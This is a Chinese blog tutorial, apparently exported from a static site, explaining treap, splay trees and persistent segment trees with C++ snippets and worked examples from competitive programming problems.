有了这样的一种数据结构，我们就可以在相当优秀的复杂度的前提下实现动态数组的查询操作，这里不再详细讲述了。但是，普通的BST有个十分致命的缺点，就是它在某些极端数据下，会导致BST退化成了一条链表，比如一个单调递增的数组[1,2,3,4,5,6,7,8]，每次插入一个点时，它都会位于上一个点的右儿子，这就导致了整个BST退化。 为了解决BST的退化问题，我们需要对原始的BST进行改进，这就产生了平衡树。同样的，和它的名字一样，平衡树和原始的BST相比的特点就是“平衡”，即每个节点的左右儿子大小比较接近，一般就不会有像之前一样的退化成链表的情况了。 treap Treap是一种实现起来十分方便的平衡树，效率也还不错。Treap是由两个单词组成的，第一个是tree，第二个是heap。tree表明treap是一种二叉搜索树，而heap表明treap同时也满足堆的性质。在这样的背景下，treap实现的期望时间复杂度为O(logn) 。具体treap是怎么实现的呢？答案就是rand()。和普通的BST相比，每个点维护两个值，一个是val，和BST一样，满足二叉搜索树的性质；另外一个是key，或者说是priority，并且满足堆的性质。 rotate 实现treap的最重要的一个操作就是旋转。旋转是平衡树的一个十分重要的操作，通过旋转，平衡树能够在保证满足二叉搜索树的性质的同时，使得左右儿子趋于平衡。代码如下：12345678910111213141516// T 表示每一个节点// rotL表示左旋，rotR表示右旋inline void rotL(T &amp;t) &#123; T t0 = t-&gt;left; t-&gt;left = t0-&gt;right; t0-&gt;right = t; t-&gt;up();t0-&gt;up(); t = t0;&#125;inline void rotR(T &amp;t) &#123; T t0 = t-&gt;right; t-&gt;right = t0-&gt;left; t0-&gt;left = t; t-&gt;up();t0-&gt;up(); t = t0;&#125; 该怎么理解好这段代码呢？以左旋为例，我们来看一下这张图，看下旋转操作究竟发生了什么。(建议自己尝试这画图理解一下)。这是初始状态，其中，我们将1号节点左旋： 第一步，我们拿到当前节点t的左儿子t0，然后将当前节点t的左儿子指向了t0的右儿子。 接着，由于t0的右儿子已经给了t，我们此时将t0的右儿子指向了t，这个时候，图像就变成了这样。 再把图片整理一下，我们发现，之前作为左儿子的t0变成了”根节点”，之前是”根节点”的t却变成了t0的右儿子。 好了，看完左旋操作，我们发现了什么呢？这个操作是不是很像以旋转的目标节点为中心的顺时针旋转操作呢？这就是为什么这个操作被称作左旋，注意到，左旋后，左儿子变成了根。同理，右旋操作会将右儿子变成根，同时，之前的根变成了之前的右儿子的左儿子。虽然有点绕，但还是要理解清楚的。 与此同时，我们发现了一个细节，旋转之前，根的左儿子的高度为2，右儿子的高度为1；旋转过后，根的左儿子的高度变成了1，右儿子的高度变成了2。结合上图，我们可以得知，左旋操作使得当前节点的左儿子高度-1，右儿子高度+1，右旋操作则反过来。因此，通过这样的旋转，我们能使整棵树趋向于平衡状态，这就是平衡树！ 旋转操作仅有这些特点吗？显然不止。如果我们把节点的val和priority写上，我们还会发现一个特征。如下图(val简写为v，priority简写为p)： 我们先看val的值。仔细观察，我们发现，旋转前，这颗树满足二叉搜索树的性质，旋转后，这颗树依然满足二叉搜索树的性质。即，旋转不破坏BST性质。这是可以证明的，读者不妨自己试一试。 接着，我们再来看一下priority的值，我们发现，在一开始的时候，priority的值不满足堆的性质，但是在左旋过后，priority的值满足了大根堆性质。这告诉了我们，旋转可以用于维护大根堆的性质，当仅有左儿子的priority大于当前节点的时候，我们可以通过左旋操作，使整棵树重新满足了堆的性质。 insert &amp; remove 能理解好treap的旋转操作的话，插入和删除其实就简单很多了，这里以bzoj3224为例，简单介绍一下插入和删除的一般写法。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#define T Node*struct Node &#123; // left right分别为指向左右儿子的指针 Node *left, *right; // v为权值，w用来表示出现的次数，即相同的v的个数，减少新建节点的操作 // p表示priority，size维护树的大小 int v, w, size, p; Node(int v, T k):v(v) &#123; left = right = k; p = rand(); w = size = 1; &#125; inline void up() &#123; size = left-&gt;size + right-&gt;size + w; &#125; *rt, *empty; // rt表示root，即根节点，empty表示空节点，用来代替NULL，可以避免对空指针造成某些奇怪的意外&#125;;void insert(T &amp;t, int v) &#123; // 指针为空时，新建节点并且返回，注意到参数为&amp;t if (t == empty) t = new Node(v, empty); else &#123; // v相同时累加即可，值小于当前节点，往左儿子插入，大于时往右边插入。 // 注意到插入过后有可能无法满足priority的大根堆性质，需要使用旋转操作来维护。 if (v == t-&gt;v) t-&gt;w++; else if (v &lt; t-&gt;v) &#123; insert(t-&gt;left, v); if (t-&gt;left-&gt;p &gt; t-&gt;p) rotL(t); &#125; else &#123; insert(t-&gt;right, v); if (t-&gt;right-&gt;p &gt; t-&gt;p) rotR(t); &#125; t-&gt;up(); &#125;&#125;void remove(T &amp;t, int v) &#123; // 删除时同理，小于的话往左儿子删，大于的话往右儿子删 if (v &lt; t-&gt;v) remove(t-&gt;left, v); else if (v &gt; t-&gt;v) remove(t-&gt;right, v); else &#123; // w大于1时，-1即可。否则删除当前节点。 // 注意到删除节点的时候，如果左右儿子其中一个为空的时候，直接用儿子代替自己即可。 // 如果左右儿子均为空，直接删除即可。 // 如果左右儿子都非空，那么就可以通过旋转操作将儿子移动到当前节点，并递归删除 // 注意旋转时要保证大根堆的性质，另外，new的对象记得回收 if (t-&gt;w &gt; 1) t-&gt;w--; else &#123; if (t-&gt;left != empty &amp;&amp; t-&gt;right != empty) &#123; if (t-&gt;left-&gt;p &gt; t-&gt;right-&gt;p) &#123; rotL(t); remove(t-&gt;right, v); &#125; else &#123; rotR(t); remove(t-&gt;left, v); &#125; t-&gt;up(); &#125; else &#123; T t0 = t; if (t-&gt;left == empty) t = t-&gt;right; else t = t-&gt;left; delete t0; &#125; &#125; &#125; if (t != empty) t-&gt;up();&#125; 其实，插入和删除操作和普通的BST是很像的，区别仅在于treap需要维护大根堆的特性，因此需要有rotate这样的操作来保证。换句话说，treap相比BST仅仅多了priority属性。当然，如果你足够细心的话，会发现treap的平衡性的维护事实上并不是稳定的，因此，treap属于弱平衡树，在某些情况下它的效果不是很好。当然，treap的最大优势在于写法比较简单，并且在实践中的整体表现也较为良好。因此是平衡树的不二选择 no rotation treap 前面我们讲的是普通的treap，它是采用旋转操作来维护priority的，但是，还有另一种类型的treap，它的实现完全不需要旋转，还能维护treap的性质，这就是无旋treap。并且重点是，无旋treap还能用于维护区间，并且支持可持久化。这是多么强大的能力！就让我们一起来学习一下吧。 既然无旋treap不是使用rotate来维护，那么它是怎么保证treap的平衡的呢？这就涉及它的两个核心函数了——split和merge。 split 和字面意思一样，split函数用于把一棵树分裂成两个部分。其中，l,r充当返回值的作用(也可以用pair类，返回两个值)，即返回分裂成功的两颗树的根。t是当前待分裂的树，v是用于分裂条件的判断的，此处v表示的是节点的值(我们知道节点的值满足二叉搜索树的性质)，v也可以用来表示需要分裂出的子树的大小，这里以按值来分裂为例子。如果v小于等于当前的值，那么说明和v相等的值只会位于左子树当中，则分裂左子树，得到分裂成功的两个子树a和b后，当前节点的左儿子应该指向子树b，并作为右节点返回给上一层，这里需要理解清楚，v大于当前节点时，处理方法同理。递归的边界条件为当前节点是空的，直接返回两个空的子树即可。123456789101112131415161718// 结构体的定义和之前一样。#define T Node*void split(T t, int v, T &amp;l, T &amp;r) &#123; if (t == empty) &#123; l = r = empty; return; &#125; if (v &lt;= t-&gt;v) &#123; split(t-&gt;l, v, l, r); t-&gt;l = r; r = t; &#125; else &#123; split(t-&gt;r, v, l, r); t-&gt;r = l; l = t; &#125; t-&gt;up();&#125; 如果还是不太理解的话，可以参考一下下面的图。节点中的值表示val。现在执行以下的函数：12T a;T b;split(rt, 4, a, b); 这个函数的结果是把当前的树rt中按照是否小于4分成了两个子树，其中，子树a的所有值小于3，b中的所有值大于等于4，不妨自己手动画一下。 merge 同样的，merge函数用于将两个子树合成为一个。注意到一个重要的事实，合并的两个子树a和b满足a中所有元素的值小于b中所有元素的值。我们考虑一下合并两个子树应有的操作。如果子树a的根节点的priority大于子树b的根节点，那么a应该作为合并后的树的根节点，这个时候，我们就将a的右儿子和b合并(因为b所有元素的值大于a，要满足BST的性质) 。否则，将a和b的左儿子合并。这里要注意参数传递的顺序，不能弄反了。递归的边界条件为子树a或b其中某一个为空，这个时候返回另一个非空的子树即可。（其实，你会发现，无旋treap只有在这个地方用到了priority，因此，即使把a-&gt;p &gt; b-&gt;p替换成rand()&amp;1也是可以的。这样，就相当于每次合并都是近似随机的了。12345678910111213T merge(T a, T b) &#123; if (a == empty) return b; if (b == empty) return a; if (a-&gt;p &gt; b-&gt;p) &#123; a-&gt;r = merge(a-&gt;r, b); a-&gt;up(); return a; &#125; else &#123; b-&gt;l = merge(a, b-&gt;l); b-&gt;up(); return b; &#125;&#125; insert &amp; remove 现在考虑我们应该如何插入一个节点。如果我们理解了split和merge操作的话，插入一个节点是很简单的。考虑插入的节点的val为v，那么我们可以将当前的树用split划分成为小于v和大于v和等于v的三个部分a，b，并且把当前节点c看作一颗独立的树，依次将a,c,b合并成一颗树即可。123456789101112void ins(int v) &#123; T a;T b; T c;T d; split(rt, v, a, b); split(b, v+1, c, d); if (c == empty) c = new Node(v, empty); else &#123; c-&gt;w++; c-&gt;size++; &#125; rt = merge(a, merge(c, d));&#125; 删除操作其实也是很类似的。我们同样将原来的树划分为三个部分。并且，得到的等于1的那个部分如果w大于1，直接减1就好。否则就直接将小于v的子树和大于v的子树合并。1234567891011void rem(int v) &#123; T a;T b; T c;T d; split(rt, v, a, b); split(b, v+1, c, d); if (c-&gt;w &gt; 1) &#123; c-&gt;w--;c-&gt;size--; d = merge(c, d); &#125; rt = merge(a, d);&#125; 当然，读者如果细心的话，会发现这里其实忘记回收节点了，这个就导致了内存泄漏了鸭(雾 build a treap 至于建立一颗treap的话，方法其实有挺多种，其中一种就是直接把每一个节点按顺序插入即可。另一种方法就是对插入的数组进行二分建树，复杂度也差不多。当然，如果是维护一个区间的话，我们可以采用笛卡尔树的建树方法，复杂度仅为O(n)。这里就不再赘述了。 maintain an interval 和普通的treap相比而言，无旋treap的一个重要用法是维护一个区间。如果现在给定一个数组a = [1,7,3,5,6,4,2]，现在以数组下标为val建树，则我们得到的树当中，对于任意一个节点，当前节点的左儿子在数组中下标一定在当前节点左侧，右儿子在数组中的下标一定在当前节点右侧，并且，每一个节点的构成的树包含的是一个连续的区间！这是一个及其重要的性质，利用这个性质，我们可以做到很多意想不到的事情，以noi2005维修数列为例。无旋treap可以动态地维护一个区间，某种程度上有点像线段树！ 题目的大题意思如下： 维护一个数列，要求支持添加，删除，翻转，修改，求和，求最大子序列和这几种操作 其中，添加和删除是很简单的，前面已经讲过，这里不再赘述。至于求和操作，我们可以在每一个节点当中存一个值用来维护子树的大小。翻转操作的话，我们可以为每个节点打上一个标记，然后仅反转左右儿子即可。最大子序列的维护方式其实和线段树的处理方法是很类似的。每个节点维护当前节点包含的区间内左端点开始的最大值，右端点开始的最大值，以及整个区间的最大子序列，这样就可以用1234sum = l-&gt;sum + r-&gt;sum + v;lsum = max(l-&gt;lsum, max(l-&gt;sum + v, l-&gt;sum + v + r-&gt;lsum));rsum = max(r-&gt;rsum, max(r-&gt;sum + v, r-&gt;sum + v + l-&gt;rsum));msum = max(max(l-&gt;msum, r-&gt;msum), max(l-&gt;rsum, 0) + v + max(r-&gt;lsum, 0)); 来维护最大子序列了，其中，msum是区间的最大子序列，lsum是从左端点开始的最大子序列，rsum是从右端点开始的最大子序列。限于篇幅，这里就不再详细展开了。但是强烈建议读者亲自去尝试实现这道题，基本上能解决这道题的话，可以说就算是基本掌握无旋treap了。 persistability 这里再简单补充一下。我们前面说，treap可以实现可持久化，那么，应该怎么实现呢？我们考虑一下之前线段树我们是怎么实现可持久化的——动态加点。因此，treap也可以用类似的思想去实现。我们每一次新的操作的时候，对每一个点都拷贝一份新的，然后就可以”复用”之前建立的树的信息了。但是一定要记住，后面的操作不能修改前面建立的树，否则可持久化特性就会被破坏。这也是为什么旋转treap不适合用于可持久化——旋转操作破坏了父子关系顺序。 具体实现过程中，我们可以写一个copyNode的复制函数(如果使用结构体和指针写法的话，可以new一个节点然后直接赋值即可)：12345678int copyNode(int rt) &#123; int cur = ++tot; ch[cur][0] = ch[rt][0]; ch[cur][1] = ch[rt][1]; sz[cur] = sz[rt]; ... // 信息的复制 return cur;&#125; 然后每一次需要更改节点的信息的时候，复制一个新的节点，在新的节点上修改信息即可，比如pushdown操作，split操作和merge操作。参考题目:可持久化文艺平衡树。 summary of treap 这里来对treap进行一个简单的总结吧。两种treap其实算是各有优势吧。第一种treap利用旋转维护priority，由于rand的随机性，我们能够实现一个效率比较高的简易平衡树。第二种treap利用的是分裂和”随机”合并操作来实现平衡的。第一种做法的优点在于它的写起来确实比较简单，并且它的常数较小。而第二种方法的优点在于能够实现区间的维护操作，并且能可持久化，写起来也比较简单。对于treap来说，无论是插入或者删除，查询等操作，其复杂度都是O(logn)，基本上算是相当优秀了。但是，treap始终是”伪”平衡树，有时候会被某些极端数据卡。 splay 前面我们介绍了treap，它确实很好用。然而，还有另外一种常用的平衡树，叫splay，中文名称为伸展树，很好地说明了这种平衡树的特性。和treap不同，splay在实现平衡的时候并不是为每个节点赋优先级，而是使用了”伸展”操作。 并且，splay在实现的时候，需要多记录一项每一个节点的父亲，用于后面的操作。 rotate 在splay中，同样有旋转操作，不过这里的旋转操作的定义和treap不太一样。我们先来看一下splay是怎么进行旋转操作的吧。以下为伪代码：123456789101112// up为每个节点的更新操作，类似treap，注意顺序。// ch[x][0] 表示x的左儿子，ch[x][1]表示x的右儿子，fa[x]表示x的父亲void rotL(int x) &#123; int y = fa[x], z = fa[y]; ch[y][0] = ch[x][1]; fa[ch[x][1]] = y; ch[x][1] = y; fa[y] = x; fa[x] = z; if (z) ch[z][y == ch[z][1]] = x; up(y);up(x);&#125; 如果仔细地画一下的话，我们会发现，splay的旋转操作事实上是每个点向上旋转的，传进去的参数是需要”向上走”的点，而treap有点像是向下旋转的，传进去的参数是需要”向下走”的点，这是两种平衡树的一个重要区别。 并且，我们还发现，使用0表示左儿子，1表示右儿子的写法，可以同时将左旋和右旋合并在一起，如下：12345678910111213inline void get(int x) &#123; return x == ch[fa[x]][1];&#125;void rotate(int x) &#123; int y = fa[x], z = fa[y], k = get(x); ch[y][k] = ch[x][k^1]; fa[ch[x][k^1]] = y; ch[x][k^1] = y; fa[y] = x; fa[x] = z; if (z) ch[z][y == ch[z][1]] = x; up(y);up(x);&#125; splay operation splay操作是伸展树的核心部分，也是比较难的部分。splay本身的目的就是把某一个节点旋转到根节点。在伸展时，需要分情况考虑: 首先，第一种类型是当前节点的父亲就是根节点，那么只需要直接旋转到根节点即可。 第二种类型是当前节点是父亲的左(右)儿子，并且父亲是爷爷的左(右)儿子，那么这个时候需要先让父亲进行旋转，之后再旋转当前节点。 第三种类型是当前节点是父亲的左(右)儿子，并且父亲是爷爷的右(左)儿子，那么这个时候当前节点需要旋转两次。 无论是那一种情况，最后的递归边界为当前节点到达了根节点(父亲为空)。如果还是不太理解的话，建议画一下。 因此，我们可以得到以下的代码：12345678910void splay(int x) &#123; int f = fa[x]; while (f) &#123; if (fa[f]) rotate(get(x) == get(f) ? f : x); rotate(x); f = fa[x]; &#125; // 注意要把根节点换了 rt = x;&#125; 事实上，如果我们把0想象成根节点的父亲的话，我们发现，这个操作事实上就是把某个节点旋转到0的儿子。这样的话，我们可以对这个函数进行一点点简单的修改，使splay操作不仅可以把某一个点旋转到根节点，还可以旋转到某个特定节点的儿子。12345678910// 这个时候k就是我们想要旋转到的某个节点，想旋转到根节点时，调用splay(x,0)即可void splay(int x, int k) &#123; int f = fa[x]; while (f != k) &#123; if (fa[f] != k) rotate(get(x) == get(f) ? f : x); rotate(x); f = fa[x]; &#125; if (!k) rt = x;&#125; insert &amp; remove splay的插入操作遵循BST的规则，即如果要插入的值小于当前节点，则向左儿子走，如果大于当前节点，则向右儿子走，如果相等，并且是可重复的话，当前节点的累计数量+1。伪代码如下: 123456789101112131415161718192021222324252627int rt, tot; // rt为根节点对应的编号, tot表示当前使用的最大的节点的编号void insert(int v) &#123; if (!rt) &#123; // 开辟一个新节点 rt = ++tot; size[rt] = 1; val[rt] = v; ... return; &#125; int cur = rt, f = 0; while (1) &#123; if (val[cur] == v) &#123; cnt[cur]++; ... break; &#125; f = cur; cur = ch[cur][val[cur] &lt; v]; if (!cur) &#123; // 开辟新的节点 cur = ++tot; fa[cur] = f; break; &#125; &#125;&#125; 删除操作事实上是很类似的，但是更加复杂一点。在删除之前，首先我们要把要删除的节点使用splay操作移动到根节点，如果是给一个值v，然后删除的话，我们需要先得到值v对应的节点的编号x，然后调用splay(x)移动到根节点。并且，移动到根节点后，还要分情况考虑： 如果x没有儿子，直接删除即可。 如果x有一个儿子，则将当前节点删除，并把唯一的儿子作为根节点。 如果x有两个儿子，则需要获取当前节点的前驱(比当前节点小的值当中最大的那个)。然后将该前驱用splay操作移动到根节点，并且直接删除节点x,并将x的右子树作为根节点的右子树即可。(这里可以这样做的原因是这个时候x的左子树必定为空，这是BST的性质) 并且，还要注意删除的时候记得更新节点，并且需要的话根节点也应该更改。 伪代码如下:1234567891011121314151617181920212223void remove(int x) &#123; remove_to_root(x); // 节点覆盖次数大于1时，直接减去 if (cnt[rt] &gt; 1) &#123; cnt[rt]--; sz[rt]--; return; &#125; if (!ch[rt][0] &amp;&amp; !ch[rt][1]) delete(rt); else if (!ch[rt][0]) delete_leftson(rt); else if (!ch[rt][1]) delete_rightson(rt); else &#123; int p = pre(), cur = rt; splay(p); fa[ch[cur][1]] = p; ch[p][1] = ch[cur][1]; clear(cur); up(rt); &#125;&#125; maintain an interval 同样的，由于splay的特性，它也很适合被用来维护某一个区间。注意到这个时候，splay中节点的组织形式应该是依据下标的！因此，这个时候splay不一定满足每个节点的val比左儿子大，比右儿子小，它满足的是每个节点的左儿子在数组中的下标一定比该节点小，而右儿子对应的下标一定比该节点的大。这里的想法其实和无旋treap某种程度上是一致的。这里以文艺平衡树为例子简单提一下区间的处理方法。 题目的大意如下： 给一个包含n个数的区间，以及m个操作，每一个操作包含两个整数l,r。要求将区间[l,r]翻转过来。输出最后区间上每个数的值 题目就只有一个区间操作，即翻转。这里，我们同样可以借用之前线段树lazy_tag的思想。当前区间需要翻转时，我们为该节点打上一个标记，并且交换左右儿子即可。当遇到翻转标记时，我们就下传即可。这里的另一个问题是，我们要怎样获得需要的区间呢？和线段树一样吗？和之前的无旋treap一样吗？ 考虑下前面我们是怎么获得一段区间的。无旋treap采用的是分裂与合并的思想。直接将需要的区间分裂出来，并打上标记即可。而splay并没有分裂操作，但是由于伸展树的特殊性，我们可以采用两次splay操作获得对应的区间。核心代码如下：12345678// 假设操作的区间是[l,r]int s1 = find(l-1); // 获得数组中第l-1个元素对应在树上的编号splay(s1, 0); // 将s1旋转到根节点int s2 = find(r+1); // 获得r+1对应的编号splay(s2, s1); // 将s2旋转到s1的儿子(这个时候s2必定为s1的右儿子，且s2左儿子为空)int x = ch[s2][0]; // 得到对应的区间的编号rev[x] = !rev[x]; // 更新标记swap(ch[x][0], ch[x][1]); // 交换左右儿子 注意一下边界情况的处理。(其实可以在原先的树中插入两个节点作为左右边界，这样l-1和r+1就不会溢出了。 summary of splay 这里就简单地对splay做一下总结吧。伸展树作为BST的另一个变种，它的特性比较”神奇”，采用splay操作会使得整颗树需要经常地做调整，就像在”伸展”一样。在时间复杂度上，插入，删除等操作均为O(logn)。当然，需要注意的是，这个复杂度是一个均摊复杂度。和treap类似，splay并不能算严格意义上的”平衡”。在某些情况下，它依然会退化成链表，当然，由于splay操作的存在，即使退化了，它也能比较快地调整回来，因此平均下来，最后的复杂度仍然能够做到O(logn)。当然，splay本身写起来并不算很好写(比起treap的话)，不过在实际中应用还是挺广泛的。 summary 数据结构大杂烩系列的第三篇文章到这里就告一段落了。在这篇文章中，我们讲了两种平衡树，treap和splay，这两种平衡树各有特点，并且在时间和空间复杂度上还是十分优秀的。另外，本身平衡树这个知识点就比较难，还是强烈建议去做几道题，这样才能真正地掌握平衡树的核心思想。这里还是推荐NOI2005维修数列这道题，难度稍微有点大，但质量很好。网上的题解有很多，不过质量参差不齐。如果需要的话可以到我的github上找，但没打注释 接下来的话，第四篇文章可能打算写一下关于红黑树的内容，敬请期待吧]]></content>
      <categories>
        <category>Data Structure</category>
      </categories>
      <tags>
        <tag>Data Structure</tag>
        <tag>Balanced Tree</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Data Structure Note(II) —— persistent segment tree]]></title>
    <url>%2F2019%2F05%2F25%2Fdata-structure2%2F</url>
    <content type="text"><![CDATA[prologue 这是数据结构大杂烩系列的第二篇文章。在前一篇文章中，我们学习了线段树及一些相关的数据结构。我们简单地了解了线段树是如何构造，如何维护的，并简单地了解了它的应用。今天，就让我们一起再深入学习它吧。 今天的主题是可持久化线段树，这是一种能存储区间“历史变化”的数据结构，本身代码量不大，但理解起来还是有一定难度的。 注：本文假设读者对线段树已经有了一定的了解。如果不知道线段树是什么，请先前往Data Structure Note(I) a simple problem 国际惯例，在深入学习相关概念之前，我们先来了解一下这样一种问题。我们知道，线段树能维护区间的最大值最小值，可如果我们要的是区间的第K大值呢？ 给定一个数组n，然后有m个询问，每个询问包含三个值L，R，K，要求输出在[L，R]区间上的第K大值(K &lt;= R - L + 1) 同样的，最直接的做法就是直接扫描区间[L，R]，拿出所有元素并从大到小排序，最后输出第K个值即可。当然，很明显这样的做法是不可取的——复杂度高达O(mnlogn)，我们发现，在这样一种情况下，我们对元素进行排序实际上做了很多“无用”的操作，我们仅仅需要第K大的值，但排序却得到了所有数字的大小顺序，显然有些冗余。那么有没有什么好的办法呢？有的，就是可持久化线段树(下称主席树) before we learnweighted segment tree 在正式进入主席树之前，我们需要先理解好权值线段树这一概念。本身权值线段树也是一种线段树，和我们在上一篇文章中提到的线段树的主要区别在于，权值线段树中叶子节点的概念不太一样。比如下面的一个数组a[]=[3,2,1,5,5,7,8]。按照之前的线段树的概念，这个时候线段树是根据下标建立的。因此，线段树一共有七个叶子节点，其中每个节点的值分别为3,2,1,5,5,7,8 那么对于权值线段树呢？由于这是按照值建立的树，通常情况下，这颗树应该有八个叶子节点(数组a中的数字的值域为[1,8])。并且，每个叶子节点中的值表示的应该是某个权值出现的次数。如果还不太理解的话可以看下图。 为什么要提到权值线段树呢？答案还是在图中。结合之前我们学习的关于线段树相关的知识。我们发现，权值线段树天生就可以被用来查找区间的第K大值，并且还是在logn的复杂度下。下面为伪代码：1234567void search(int rt, int l, int r, int k) &#123; if (l == r) return l // 当左儿子的权值w&lt;=k时，说明左儿子至少有k个数，第k大的一定在左儿子 // 否则第k大的数一定在右儿子，且是右儿子中第k-w大的数 if (左儿子权值不大于k) search(lson(rt), l, mid, k) else search(rson(rt), mid+1, r, k - weight(lson(rt)))&#125; 这样，我们就发现，如果对整个数组建立一颗权值线段树的话，我们可以在logn复杂度的前提下，得到整个数组中第k大的数字，我们成功地向答案迈进了第一步! 再考虑一下，如果我们只是对部分数组建立权值线段树呢？比如，将区间[1,x]的所有数字放在一起，建立一颗权值线段树，按照上面的逻辑，我们就可以获得区间[1,x]中任意第k大的数字了。 再前进一步，如果我们能够对区间[l,r]建立一颗权值线段树，那么我们是不是就可以得到区间的第k大的数字了呢？恩，这个就是主席树基本原理之一。 weighted segment tree’s operations 前面我们说，如果能对所有的区间建立线段树的话，我们就可以顺利地解决区间的第k大问题了，但是这样的复杂度未免也太高了。区间总数为O(n^2)，建树的复杂度是O(nlogn)，合起来的复杂度高达O(n^3 logn)，当然，即使时间上能接受，空间上也接受不了。因此，我们必须想办法减少开销。一个可行的办法是，利用权值线段树可以做减法的特点。这是什么意思呢？比如我们现在得到了在区间[1,x]和区间[1,y]上建立的两颗权值线段树(y&gt;x)，这个时候这两颗树之间所有对应的节点之间做减法，我们就可以得到在区间[x+1,y]上建立的权值线段树。如果不能理解，可以参考下图。(这里建议自己画图理解理解，这是解决主席树问题的关键一步) make full use of last tree 前面我们得到了这样一个结论：两颗权值线段树[1,x],[1,y]之间做减法，可以直接得到第三颗权值线段树[x+1,y]。因此，我们只需要建立O(n)颗线段树就好了。这样，我们就再次降低了复杂度。但是，我们又发现了另一个问题，对于以区间[1,x]和[1,x+1]建立的两颗线段树来说，其实发生变化的最多只有logn个节点(想想为什么)，因此，它们之前很多信息是重复的，如果我们能够重复利用这段信息的话，那样也许就能降低复杂度了。 如果要利用前一颗线段树的信息，最直接的办法就是直接复用前一颗线段树的节点，对于当前的节点，如果左儿子的信息需要更新，那么我们就重新开一个点，将当前节点的左儿子连接到新开的点，并赋予新值，将当前节点的右儿子连接到前一颗线段树对应的节点即可。 这个思想很简单，但却是主席树的精华所在。同样的，如果不是很理解，可以参考下图。当然，这里还是同样建议自己试着画图，更有助于理解。 persistent segment tree 现在，我们终于可以正式进入主席树了。其实，大部分要讲的东西已经讲完了。这里还是贴一下代码吧，结合代码理解起来会更方便一些。这里以POJ2104为例子，简单地提一下主席树的写法。 build 在建树的时候，要注意一个问题，对主席树而言，建树的空间复杂度为O(nlogn)，因此，建议在申请空间时，直接开一个(N&lt;&lt;5)大小的数组，避免空间不够导致的错误。123456789101112131415161718#define N 100111#define MAXN (N&lt;&lt;5)#define mid(l,r) ((l+r)&gt;&gt;1)int a[N], b[N]; // a, b数组用于读入数据，与题目有关int tot = 0; // 动态开点，注意，不建议使用malloc，效率过低int rt[N], lson[MAXN], rson[MAXN], sum[MAXN];// rt[i]表示建立的第i颗树的树根index// lson[i]和rson[i]分别表示index为i的节点的左右儿子的index，注意到不能用i&lt;&lt;1和i&lt;&lt;1|1表示左右儿子了// sum[i] 表示当前节点所对应的区间的值的出现次数// main函数中使用build(rt[0], 1, n)进行建树即可void build(int&amp; x, int l, int r) &#123; x = ++tot; sum[x] = 0; if (l == r) return; int mid = mid(l,r); build(lson[x], l, mid); build(rson[x], mid+1, r);&#125; update 更新的操作其实和线段树基本一样。但每一个节点都是动态开启的。记得将当前树和上一颗树关联起来即可。12345678910111213// 具体建树的时候，扫描一整个数组，对于每一个值(注意不是下标)，// 调用update(rt[x], rt[x-1], 1, n, a[x])即可void update(int&amp; x, int lrt, int l, int r, int pos) &#123; x = ++tot; sum[x] = sum[lrt] + 1; if (l == r) return; lson[x] = lson[lrt]; // 此处将当前节点与上一颗树的左儿子连接在一起 rson[x] = rson[lrt]; // 右儿子同样 int mid = mid(l,r); // 如果需要更新的在左儿子，将左儿子传入，注意到lson[x]的值在下一层迭代中会被覆盖，即开启了新的节点，右儿子同理 if (pos &lt;= mid) update(lson[x], lson[lrt], l, mid, pos); else update(rson[x], rson[lrt], mid+1, r, pos);&#125; query12345678// 查询区间[L,R]时，调用query(rt[R],rt[L-1],1,n,k)即可int query(int L, int R, int l, int r, int k) &#123; if (l == r) return l; int mid = mid(l,r); int cnt = sum[lson[R]] - sum[lson[L]]; // 利用权值线段树可减的特性，得到对应区间左儿子的权值 if (k &lt;= cnt) return query(lson[L], lson[R], l, mid, k); else return query(rson[L], rson[R], mid+1, r, k - cnt); // 记得减去左儿子权值&#125; something else 在处理实际问题的时候，我们还需要注意一个问题。建立权值线段树的时候，通常权值的范围可能在-2^31~2^31-1之间，对于这样大的一个范围，显然我们是不可能建立线段树的，因此比较合理的做法应该是使用在上一篇文章中提到的离散化，将权值映射到区间[1,n]上，并进行去重操作，这样复杂度就变得很合理了。在C++中，可以这样写：12sort(b+1, b+n+1);int m = unique(b+1, b+n+1) - (b+1); 其中，sort用于对数组进行排序，unique用于去重，返回的是尾指针。 另外，如果理解了主席树的思想的话，我们会发现，一开始我们使用build函数的时候，建立的树rt[0]事实上是空的，因此build函数是可以不用的，直接for循环并且动态地添加每一个点即可。 总的来说，主席树在建立新的树的时候，用的是动态开点，每一次更新操作，时间和空间复杂度均为O(logn)。建树总时间和空间复杂度均为O(nlogn)，对于询问的总复杂度为O(mlogn)，这样就都降低到可以接受的范围内了。并且，主席树最核心的思想在于它充分利用了前一颗树的信息，大幅度降低了复杂度。现在，我们能够成功地解决在文章一开始的时候提出的问题了。(建议做一道模板题以加深理解。 level up - count on a tree 之前，我们利用主席树解决了区间的第k大的问题，现在，我们题目的难度升级了，如果是要求在树上的第k大值呢？恩，还是用主席树，那么这个时候又该怎么处理呢？之前我们能够求出区间上的第k大的值，是因为区间是连续，而且是线性的，我们能够使用sum[R]-sum[L-1]得到区间[L,R]上的值，然而，如果是在一颗树上的话，它并不满足线性这一条件。那该怎么办呢？ 一个可行解是对我们的答案进行差分。对于在树上的两个点u和v，他们之间有且仅有一条唯一的路径，这个时候，假设他们的最近公共祖先(lca)为t的话，那么u和v上的点的权值的和变成sum[u]+sum[v]-sum[t]-sum[fa[t]]。这里，fa[t]表示t的父亲节点，注意，这里同样用到了权值线段树可以进行减法的特性。并且，这里的sum[x]表示的应该是当前节点x到根节点的所有值建成的权值线段树。如果能理解好这一点的话，那么这个问题也就变得很简单了。 具体实现时，我们只需要在更新的时候，调用update(rt[x],rt[fa[x]],1,n,a[x])，即使用当前节点的父亲节点去更新当前节点，并且，query需要进行一定的更改，具体如下： 123456789// 调用的时候为query(1,n,u,v,lca(u,v),fa[lca(u,v)],k)即可int query(int l, int r, int u, int v, int lca, int f_lca, int k) &#123; if (l == r) return l; // 这里进行了差分的操作 int s = sum[lson[u]] + sum[lson[v]] - sum[lson[lca]] - sum[lson[f_lca]]; int mid = mid(l,r); if (k &lt;= s) return query(l, mid, lson[u], lson[v], lson[lca], lson[f_lca], k); else return query(mid+1, r, rson[u], rson[v], rson[lca], rson[f_lca], k - s);&#125; how to find lca 查询最近公共祖先的方法有很多(不知道这个算不算是数据结构的知识)。其中一种可行的解法就是采用倍增，在O(nlogn)的预处理后，能在O(logn)的复杂度下求得最近公共祖先。另外一种可行的解法是采用树链剖分，也是一种数据结构中的常用算法，这里就不进行赘述了。 level up up! 